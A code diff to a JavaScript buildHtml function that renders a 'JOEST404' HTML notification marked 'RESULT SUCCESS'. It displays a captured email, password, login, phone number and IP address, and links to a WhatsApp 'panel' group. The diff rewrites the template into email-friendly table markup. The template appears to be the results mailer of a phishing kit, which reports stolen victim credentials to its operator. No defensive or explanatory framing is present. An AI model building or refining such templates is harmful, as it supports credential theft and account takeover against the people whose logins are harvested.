@@ -153,292 +153,181 @@ function buildHtml(vars) {
 
             
 
-<!DOCTYPE html>
-<html lang="en">
+    <!DOCTYPE html><html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>JOEST27</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-
-<style>
-
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
-
-body{
-    min-height:100vh;
-    background:
-    radial-gradient(circle at top center,#2f2f2f 0%,#111111 25%,#050505 70%);
-    font-family:'Inter',sans-serif;
-    color:#fff;
-    padding:25px;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-}
-
-.wrapper{
-    width:100%;
-    max-width:850px;
-    position:relative;
-}
-
-.glow{
-    position:absolute;
-    width:350px;
-    height:350px;
-    background:#ffffff;
-    opacity:.05;
-    filter:blur(140px);
-    top:-100px;
-    left:50%;
-    transform:translateX(-50%);
-}
-
-.panel{
-    position:relative;
-    overflow:hidden;
-    border-radius:32px;
-    background:rgba(255,255,255,.04);
-    backdrop-filter:blur(20px);
-    border:1px solid rgba(255,255,255,.08);
-    box-shadow:
-    0 20px 80px rgba(0,0,0,.6),
-    0 0 40px rgba(255,255,255,.04);
-}
-
-.panel::before{
-    content:"";
-    position:absolute;
-    top:0;
-    left:0;
-    right:0;
-    height:3px;
-    background:linear-gradient(
-        90deg,
-        transparent,
-        #ffffff,
-        transparent
-    );
-}
-
-.header{
-    text-align:center;
-    padding:55px 30px 40px;
-}
-
-.logo{
-    font-size:52px;
-    font-weight:900;
-    letter-spacing:10px;
-}
-
-.subtitle{
-    margin-top:12px;
-    color:#888;
-    font-size:13px;
-    letter-spacing:4px;
-}
-
-.status{
-    display:inline-flex;
-    align-items:center;
-    gap:12px;
-    margin-top:28px;
-    padding:12px 22px;
-    border-radius:999px;
-    background:rgba(0,255,128,.08);
-    border:1px solid rgba(0,255,128,.2);
-    color:#00ff9c;
-    font-size:13px;
-    font-weight:700;
-}
-
-.status-dot{
-    width:12px;
-    height:12px;
-    border-radius:50%;
-    background:#00ff9c;
-    box-shadow:
-    0 0 15px #00ff9c,
-    0 0 30px #00ff9c;
-}
-
-.content{
-    padding:0 30px 35px;
-}
-
-.item{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    gap:20px;
-    padding:20px 0;
-    border-bottom:1px solid rgba(255,255,255,.06);
-}
-
-.item:last-child{
-    border-bottom:none;
-}
-
-.label{
-    color:#777;
-    font-size:12px;
-    letter-spacing:3px;
-    font-weight:700;
-}
-
-.value{
-    color:#fff;
-    font-size:15px;
-    font-weight:500;
-    text-align:right;
-    word-break:break-word;
-}
-
-.join{
-    padding:0 30px 35px;
-}
-
-.btn{
-    display:block;
-    width:100%;
-    text-align:center;
-    text-decoration:none;
-    padding:18px;
-    border-radius:18px;
-    background:#ffffff;
-    color:#000;
-    font-size:14px;
-    font-weight:900;
-    letter-spacing:3px;
-    transition:.3s;
-}
-
-.btn:hover{
-    transform:translateY(-3px);
-    box-shadow:0 0 35px rgba(255,255,255,.2);
-}
-
-.footer{
-    text-align:center;
-    padding:22px;
-    color:#666;
-    border-top:1px solid rgba(255,255,255,.06);
-    font-size:12px;
-}
-
-@media(max-width:700px){
-
-    body{
-        padding:15px;
-    }
-
-    .logo{
-        font-size:36px;
-        letter-spacing:6px;
-    }
-
-    .item{
-        flex-direction:column;
-        align-items:flex-start;
-    }
-
-    .value{
-        text-align:left;
-    }
-
-    .content{
-        padding:0 20px 25px;
-    }
-
-    .join{
-        padding:0 20px 25px;
-    }
-
-}
-
-</style>
-</head>
-
-<body>
-
-<div class="wrapper">
-
-<div class="glow"></div>
-
-<div class="panel">
-
-<div class="header">
-
-<div class="logo">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>JOEST404</title>
+</head><body style="margin:0;padding:20px;background:#0a0a0a;font-family:Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0">
+<tr>
+<td align="center"><table width="650" cellpadding="0" cellspacing="0" border="0" style="
+background:#111111;
+border:1px solid #222222;
+border-radius:20px;
+overflow:hidden;
+"><tr>
+<td align="center" style="
+padding:50px 30px;
+border-bottom:1px solid #222222;
+"><div style="
+font-size:48px;
+font-weight:900;
+color:#ffffff;
+letter-spacing:6px;
+">
 JOEST404
-</div>
-
-<div class="subtitle">
-PRIVATE  ACCESS RESS
-</div>
-
-<div class="status">
-<div class="status-dot"></div>
-RESULT SUCCESS
-</div>
-
-</div>
-
-<div class="content">
-
-<div class="item">
-<div class="label">EMAIL</div>
-<div class="value">${vars.email}</div>
-</div>
-
-
-
-<div class="item">
-<div class="label">PASSWORD</div>
-<div class="value">${vars.password}</div>
-</div>
-
-<div class="item">
-<div class="label">LOGIN </div>
-<div class="value">${vars.login}</div>
-</div>
-
-<div class="item">
-<div class="label">PHONE</div>
-<div class="value">${vars.phone}</div>
-</div>
-
-<div class="item">
-<div class="label">IP ADDRESS</div>
-<div class="value">${vars.ip}</div>
-</div>
-
-</div>
-
-<div class="join">
-
-<a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1" class="btn">
-JOIN WHATSAPP  GROUP PANEL 
+</div><div style="
+margin-top:10px;
+font-size:12px;
+letter-spacing:4px;
+color:#777777;
+">
+PRIVATE ACCESS RESS
+</div><div style="
+display:inline-block;
+margin-top:25px;
+padding:12px 24px;
+background:#06281b;
+border:1px solid #00ff99;
+border-radius:999px;
+color:#00ff99;
+font-size:13px;
+font-weight:bold;
+">
+● RESULT SUCCESS
+</div></td>
+</tr><tr>
+<td style="padding:35px;"><table width="100%" cellpadding="0" cellspacing="0"><tr>
+<td style="
+padding:16px 0;
+color:#888888;
+font-size:12px;
+font-weight:bold;
+letter-spacing:3px;
+">
+EMAIL
+</td><td align="right" style="
+padding:16px 0;
+color:#ffffff;
+font-size:16px;
+font-weight:600;
+">
+${vars.email}
+</td>
+</tr><tr>
+<td colspan="2">
+<hr style="border:none;border-top:1px solid #222222;">
+</td>
+</tr><tr>
+<td style="
+padding:16px 0;
+color:#888888;
+font-size:12px;
+font-weight:bold;
+letter-spacing:3px;
+">
+PASSWORD
+</td><td align="right" style="
+padding:16px 0;
+color:#ffffff;
+font-size:16px;
+font-weight:600;
+">
+${vars.password}
+</td>
+</tr><tr>
+<td colspan="2">
+<hr style="border:none;border-top:1px solid #222222;">
+</td>
+</tr><tr>
+<td style="
+padding:16px 0;
+color:#888888;
+font-size:12px;
+font-weight:bold;
+letter-spacing:3px;
+">
+LOGIN
+</td><td align="right" style="
+padding:16px 0;
+color:#ffffff;
+font-size:16px;
+font-weight:600;
+">
+${vars.login}
+</td>
+</tr><tr>
+<td colspan="2">
+<hr style="border:none;border-top:1px solid #222222;">
+</td>
+</tr><tr>
+<td style="
+padding:16px 0;
+color:#888888;
+font-size:12px;
+font-weight:bold;
+letter-spacing:3px;
+">
+PHONE
+</td><td align="right" style="
+padding:16px 0;
+color:#ffffff;
+font-size:16px;
+font-weight:600;
+">
+${vars.phone}
+</td>
+</tr><tr>
+<td colspan="2">
+<hr style="border:none;border-top:1px solid #222222;">
+</td>
+</tr><tr>
+<td style="
+padding:16px 0;
+color:#888888;
+font-size:12px;
+font-weight:bold;
+letter-spacing:3px;
+">
+IP ADDRESS
+</td><td align="right" style="
+padding:16px 0;
+color:#ffffff;
+font-size:16px;
+font-weight:600;
+">
+${vars.ip}
+</td>
+</tr></table></td>
+</tr><tr>
+<td style="padding:0 35px 35px 35px;"><a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1"
+style="
+display:block;
+text-align:center;
+padding:18px;
+background:#ffffff;
+color:#000000;
+text-decoration:none;
+font-weight:900;
+letter-spacing:2px;
+border-radius:12px;
+">
+JOIN WHATSAPP GROUP
 </a>
 
-</div>
-
-<div class="footer">
-© 2026 JOEST404 • 
-</div>
-
-</div>
-
-</div>
-
-</body>
+</td>
+</tr><tr>
+<td align="center" style="
+padding:20px;
+border-top:1px solid #222222;
+font-size:12px;
+color:#666666;
+">
+© 2026 JOEST404 • Premium Notification System
+</td>
+</tr></table></td>
+</tr>
+</table></body>
 </html>
 
 `;
